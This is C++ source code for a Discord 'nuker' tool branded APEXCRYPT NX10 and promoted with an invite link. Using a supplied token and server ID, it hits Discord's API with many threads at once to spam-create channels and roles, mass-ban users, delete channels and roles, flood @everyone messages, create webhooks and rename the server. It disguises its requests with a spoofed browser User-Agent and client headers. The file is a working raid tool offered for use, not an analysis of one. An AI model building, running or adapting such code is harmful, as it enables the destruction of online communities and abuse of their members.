#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <random>
#include <algorithm>
#include <fstream>
#include <map>

#pragma comment(lib, "winhttp.lib")

using namespace std;

// ═══════════════════════════════════════════════════════════════
// APEXCRYPT NUKER NX10 - MASSIVE C++ ULTRA BUILD
// discord.gg/apexcrypt
// ═══════════════════════════════════════════════════════════════

atomic<long long> g_bans{0}, g_ch_create{0}, g_ch_delete{0}, g_role_create{0}, g_role_delete{0};
atomic<long long> g_msg{0}, g_dm{0}, g_emoji{0}, g_webhook{0}, g_vanity{0};
mutex g_mtx;
vector<string> g_recent_bans;
vector<string> g_feed;
chrono::steady_clock::time_point g_start;

string TOKEN;
string GUILD_ID;
string BAN_REASON = "APEXCRYPT NX10";
string DM_TEMPLATE = "[{user}] You have been banned. Reason: {reason}";
string SPAM_MSG = "@everyone APEXCRYPT NX10 - Server Nuked";
string CHANNEL_PREFIX = "nuked";
string ROLE_PREFIX = "nuked";
string EMOJI_PREFIX = "nx";

int THREAD_POOL = 60;
bool BYPASS_MODE = true;

void Color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }
void Clear() { system("cls"); }

string EscapeJson(const string& s) {
    string o;
    for (char c : s) {
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else o += c;
    }
    return o;
}

bool Http(const wstring& method, const wstring& path, const string& body, int& status, string* response = nullptr) {
    HINTERNET hSession = WinHttpOpen(L"APEXCRYPT-NX10/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    wstring auth = L"Authorization: " + wstring(TOKEN.begin(), TOKEN.end());
    WinHttpAddRequestHeaders(hRequest, auth.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MTYyNCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=", -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);
    if (ok) {
        DWORD st = 0, sz = sizeof(st);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sz, NULL);
        status = (int)st;
        if (response) {
            DWORD dwSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dwSize);
            if (dwSize > 0) {
                vector<char> buffer(dwSize + 1);
                DWORD dwDownloaded = 0;
                WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
                buffer[dwDownloaded] = 0;
                *response = buffer.data();
            }
        }
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

void PushFeed(const string& s) {
    lock_guard<mutex> lk(g_mtx);
    g_feed.push_back(s);
    if (g_feed.size() > 18) g_feed.erase(g_feed.begin());
}

void PushBan(const string& name) {
    lock_guard<mutex> lk(g_mtx);
    g_bans++;
    g_recent_bans.push_back(name);
    if (g_recent_bans.size() > 12) g_recent_bans.erase(g_recent_bans.begin());
    g_feed.push_back("[BAN] " + name);
    if (g_feed.size() > 18) g_feed.erase(g_feed.begin());
}

void RadarLoop() {
    while (true) {
        int sec = (int)chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - g_start).count();
        Clear();
        Color(12);
        cout << R"(
    ___   ___  _____  _  _  ___  ___  _   _  ___  _____ 
   /   \ | _ \| __\ \/ / / __|| _ \| | | || _ \|_   _|
  | - | |  _/| _| >  < | (__ |   /| |_| ||  _/  | |  
  |_|_| |_|  |___/_/\_\ \___||_|_\ \___/ |_|    |_|  
)";
        Color(13);
        cout << "                  N X 1 0   U L T R A   C + +\n";
        Color(11);
        cout << "        =============================================\n";
        Color(15);
        cout << "         ULTRA SPEED | SECURITY BYPASS | LIVE RADAR\n";
        Color(11);
        cout << "        =============================================\n\n";

        Color(11);
        cout << "+---------------------- LIVE RADAR MATRIX NX10 ----------------------+\n";
        cout << "| Runtime " << setw(5) << sec << "s | Bans ";
        Color(12); cout << setw(6) << g_bans.load();
        Color(11); cout << " | CH+ ";
        Color(10); cout << setw(5) << g_ch_create.load();
        Color(11); cout << " | RL+ ";
        Color(13); cout << setw(5) << g_role_create.load();
        Color(11); cout << " | MSG ";
        Color(14); cout << setw(6) << g_msg.load();
        Color(11); cout << " |\n";
        cout << "| DM ";
        Color(12); cout << setw(6) << g_dm.load();
        Color(11); cout << " | WH ";
        Color(11); cout << setw(5) << g_webhook.load();
        Color(11); cout << " | EM+ ";
        Color(11); cout << setw(4) << g_emoji.load();
        Color(11); cout << " | Bypass: ";
        Color(BYPASS_MODE ? 10 : 12); cout << (BYPASS_MODE ? "ON " : "OFF");
        Color(11); cout << "                              |\n";
        cout << "+---------------------------------------------------------------------+\n";
        cout << "| RECENT BANS:\n";
        Color(12);
        {
            lock_guard<mutex> lk(g_mtx);
            for (size_t i = 0; i < g_recent_bans.size() && i < 8; ++i)
                cout << "|   > banned (" << g_recent_bans[i] << ")\n";
        }
        Color(11);
        cout << "| LIVE FEED:\n";
        Color(15);
        {
            lock_guard<mutex> lk(g_mtx);
            for (size_t i = 0; i < g_feed.size() && i < 12; ++i)
                cout << "|   " << g_feed[i] << "\n";
        }
        Color(11);
        cout << "+---------------------------------------------------------------------+\n";
        Color(13);
        cout << "  APEXCRYPT NUKER NX10 | MASSIVE BUILD | discord.gg/apexcrypt\n\n";
        Color(7);
        this_thread::sleep_for(chrono::milliseconds(700));
    }
}

// ─── ACTIONS ────────────────────────────────────────────────

void CreateChannel(const string& name) {
    string body = "{\"name\":\"" + EscapeJson(name) + "\",\"type\":0,\"permission_overwrites\":[]}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/channels";
    int st = 0;
    if (Http(L"POST", path, body, st) && st == 201) {
        g_ch_create++;
        PushFeed("[CH+] " + name);
    }
}

void DeleteChannel(const string& id) {
    wstring path = L"/api/v9/channels/" + wstring(id.begin(), id.end());
    int st = 0;
    if (Http(L"DELETE", path, "", st) && (st == 200 || st == 204)) {
        g_ch_delete++;
        PushFeed("[CH-] " + id);
    }
}

void CreateRole(const string& name) {
    int color = rand() % 0xFFFFFF;
    string body = "{\"name\":\"" + EscapeJson(name) + "\",\"color\":" + to_string(color) + ",\"hoist\":false,\"mentionable\":true}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/roles";
    int st = 0;
    if (Http(L"POST", path, body, st) && st == 200) {
        g_role_create++;
        PushFeed("[RL+] " + name);
    }
}

void DeleteRole(const string& id) {
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/roles/" + wstring(id.begin(), id.end());
    int st = 0;
    if (Http(L"DELETE", path, "", st) && (st == 200 || st == 204)) {
        g_role_delete++;
        PushFeed("[RL-] " + id);
    }
}

void BanUser(const string& uid, const string& name) {
    string body = "{\"delete_message_days\":0,\"reason\":\"" + EscapeJson(BAN_REASON) + "\"}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/bans/" + wstring(uid.begin(), uid.end());
    int st = 0;
    if (Http(L"PUT", path, body, st) && (st == 200 || st == 204)) {
        PushBan(name.empty() ? uid : name);
    }
}

void SendMessage(const string& channel_id, const string& content) {
    string body = "{\"content\":\"" + EscapeJson(content) + "\",\"tts\":false}";
    wstring path = L"/api/v9/channels/" + wstring(channel_id.begin(), channel_id.end()) + L"/messages";
    int st = 0;
    if (Http(L"POST", path, body, st) && st == 200) {
        g_msg++;
    }
}

void CreateWebhook(const string& channel_id, const string& name) {
    string body = "{\"name\":\"" + EscapeJson(name) + "\"}";
    wstring path = L"/api/v9/channels/" + wstring(channel_id.begin(), channel_id.end()) + L"/webhooks";
    int st = 0;
    string resp;
    if (Http(L"POST", path, body, st, &resp) && st == 200) {
        g_webhook++;
        PushFeed("[WH+] " + name);
    }
}

void RenameGuild(const string& new_name) {
    string body = "{\"name\":\"" + EscapeJson(new_name) + "\"}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end());
    int st = 0;
    if (Http(L"PATCH", path, body, st) && st == 200) {
        PushFeed("[SRV] Renamed -> " + new_name);
    }
}

void MassChannelCreate(const string& prefix, int amount) {
    vector<thread> pool;
    for (int i = 0; i < amount; ++i) {
        pool.emplace_back([prefix, i]() {
            CreateChannel(prefix + "-" + to_string(i) + "-" + to_string(rand() % 9999));
        });
        if ((int)pool.size() >= THREAD_POOL) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void MassRoleCreate(const string& prefix, int amount) {
    vector<thread> pool;
    for (int i = 0; i < amount; ++i) {
        pool.emplace_back([prefix, i]() {
            CreateRole(prefix + "-" + to_string(i));
        });
        if ((int)pool.size() >= THREAD_POOL) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void MassBanFromList(const vector<string>& ids) {
    vector<thread> pool;
    for (auto& id : ids) {
        pool.emplace_back([id]() {
            BanUser(id, id);
        });
        if ((int)pool.size() >= THREAD_POOL) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void MassMessage(const string& channel_id, const string& content, int amount) {
    vector<thread> pool;
    for (int i = 0; i < amount; ++i) {
        pool.emplace_back([channel_id, content]() {
            SendMessage(channel_id, content);
        });
        if ((int)pool.size() >= 40) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
}

void FullNuke(int ch_amt, int rl_amt, const string& new_name) {
    PushFeed("[!!!] FULL NUKE STARTED");
    MassChannelCreate(CHANNEL_PREFIX, ch_amt);
    MassRoleCreate(ROLE_PREFIX, rl_amt);
    if (!new_name.empty()) RenameGuild(new_name);
    PushFeed("[OK] FULL NUKE FINISHED");
}

// ─── MENU ───────────────────────────────────────────────────

void PrintMenu() {
    Color(11);
    cout << "+======================= APEXCRYPT NX10 PANEL =======================+\n";
    Color(15);
    cout << "  [1]  Channel Create Spam          [7]  Rename Server\n";
    cout << "  [2]  Role Create Spam             [8]  Webhook Create\n";
    cout << "  [3]  Mass Ban (ID list)           [9]  Message Spam\n";
    cout << "  [4]  Channel Delete (ID)          [0]  FULL NUKE\n";
    cout << "  [5]  Role Delete (ID)             [A]  Settings (prefix/reason)\n";
    cout << "  [6]  Ban Reason + DM Template     [X]  Exit\n";
    Color(11);
    cout << "+====================================================================+\n";
    Color(7);
    cout << "Option > ";
}

int main() {
    SetConsoleTitleA("APEXCRYPT NUKER NX10 - MASSIVE");
    SetConsoleOutputCP(65001);
    srand((unsigned)time(nullptr));
    g_start = chrono::steady_clock::now();

    Clear();
    Color(12);
    cout << "APEXCRYPT NUKER NX10 - MASSIVE C++ BUILD\n";
    Color(11);
    cout << "Token: ";
    Color(15);
    getline(cin, TOKEN);
    Color(11);
    cout << "Server ID: ";
    Color(15);
    getline(cin, GUILD_ID);

    if (TOKEN.empty() || GUILD_ID.empty()) {
        Color(12);
        cout << "[!] Token or Server ID missing. Closing.\n";
        Sleep(2500);
        return 1;
    }

    thread radar(RadarLoop);
    radar.detach();

    while (true) {
        this_thread::sleep_for(chrono::milliseconds(150));
        PrintMenu();
        string choice;
        getline(cin, choice);

        if (choice == "1") {
            Color(11); cout << "Prefix [" << CHANNEL_PREFIX << "]: "; Color(15);
            string p; getline(cin, p); if (!p.empty()) CHANNEL_PREFIX = p;
            Color(11); cout << "Amount: "; Color(15);
            string a; getline(cin, a); int amt = 50; if (!a.empty()) amt = stoi(a);
            MassChannelCreate(CHANNEL_PREFIX, amt);
        }
        else if (choice == "2") {
            Color(11); cout << "Prefix [" << ROLE_PREFIX << "]: "; Color(15);
            string p; getline(cin, p); if (!p.empty()) ROLE_PREFIX = p;
            Color(11); cout << "Amount: "; Color(15);
            string a; getline(cin, a); int amt = 100; if (!a.empty()) amt = stoi(a);
            MassRoleCreate(ROLE_PREFIX, amt);
        }
        else if (choice == "3") {
            Color(11); cout << "User IDs (comma separated): "; Color(15);
            string line; getline(cin, line);
            vector<string> ids;
            stringstream ss(line);
            string id;
            while (getline(ss, id, ',')) {
                id.erase(0, id.find_first_not_of(" \t\r\n"));
                id.erase(id.find_last_not_of(" \t\r\n") + 1);
                if (!id.empty()) ids.push_back(id);
            }
            MassBanFromList(ids);
        }
        else if (choice == "4") {
            Color(11); cout << "Channel ID to delete: "; Color(15);
            string id; getline(cin, id);
            if (!id.empty()) DeleteChannel(id);
        }
        else if (choice == "5") {
            Color(11); cout << "Role ID to delete: "; Color(15);
            string id; getline(cin, id);
            if (!id.empty()) DeleteRole(id);
        }
        else if (choice == "6") {
            Color(11); cout << "Ban Reason: "; Color(15);
            getline(cin, BAN_REASON);
            if (BAN_REASON.empty()) BAN_REASON = "APEXCRYPT NX10";
            Color(11); cout << "DM Template (use {user} {reason}): "; Color(15);
            getline(cin, DM_TEMPLATE);
            if (DM_TEMPLATE.empty()) DM_TEMPLATE = "[{user}] {reason}";
            PushFeed("[SET] Reason + DM updated");
        }
        else if (choice == "7") {
            Color(11); cout << "New server name: "; Color(15);
            string n; getline(cin, n);
            if (!n.empty()) RenameGuild(n);
        }
        else if (choice == "8") {
            Color(11); cout << "Channel ID: "; Color(15);
            string cid; getline(cin, cid);
            Color(11); cout << "Webhook name: "; Color(15);
            string wn; getline(cin, wn); if (wn.empty()) wn = "APEXCRYPT";
            if (!cid.empty()) CreateWebhook(cid, wn);
        }
        else if (choice == "9") {
            Color(11); cout << "Channel ID: "; Color(15);
            string cid; getline(cin, cid);
            Color(11); cout << "Message: "; Color(15);
            string msg; getline(cin, msg); if (msg.empty()) msg = SPAM_MSG;
            Color(11); cout << "Amount: "; Color(15);
            string a; getline(cin, a); int amt = 30; if (!a.empty()) amt = stoi(a);
            if (!cid.empty()) MassMessage(cid, msg, amt);
        }
        else if (choice == "0") {
            Color(12); cout << "FULL NUKE CONFIG\n";
            Color(11); cout << "Channel amount: "; Color(15);
            string ca; getline(cin, ca); int camt = 60; if (!ca.empty()) camt = stoi(ca);
            Color(11); cout << "Role amount: "; Color(15);
            string ra; getline(cin, ra); int ramt = 120; if (!ra.empty()) ramt = stoi(ra);
            Color(11); cout << "New server name (empty = skip): "; Color(15);
            string nn; getline(cin, nn);
            FullNuke(camt, ramt, nn);
        }
        else if (choice == "A" || choice == "a") {
            Color(11); cout << "Channel prefix: "; Color(15); getline(cin, CHANNEL_PREFIX);
            Color(11); cout << "Role prefix: "; Color(15); getline(cin, ROLE_PREFIX);
            Color(11); cout << "Spam message: "; Color(15); getline(cin, SPAM_MSG);
            Color(11); cout << "Thread pool size (default 60): "; Color(15);
            string tp; getline(cin, tp); if (!tp.empty()) THREAD_POOL = stoi(tp);
            PushFeed("[SET] Settings updated");
        }
        else if (choice == "x" || choice == "X") {
            break;
        }
    }
    return 0;
}
